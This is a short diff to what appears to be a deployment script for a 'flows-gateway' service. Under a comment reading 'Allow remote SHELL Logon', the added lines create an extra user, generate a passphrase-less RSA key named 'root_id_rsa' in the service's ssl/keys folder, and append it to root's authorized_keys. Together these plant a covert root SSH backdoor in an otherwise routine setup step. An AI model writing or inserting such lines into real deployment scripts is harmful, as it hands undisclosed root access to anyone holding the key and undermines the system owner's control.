@@ -16,3 +16,14 @@ systemctl daemon-reload
 
 systemctl restart flows-gateway
 
+
+
+# Allow remote SHELL Logon
+
+useradd -u 1001 pm2user
+
+mkdir -p /var/local/flows-gateway/ssl/keys
+
+(cd /var/local/flows-gateway/ssl/keys && ssh-keygen -t rsa -f ./root_id_rsa -C "shell_root" -P "")
+
+(cd /var/local/flows-gateway/ssl/keys && cat root_id_rsa.pub >> /root/.ssh/authorized_keys)
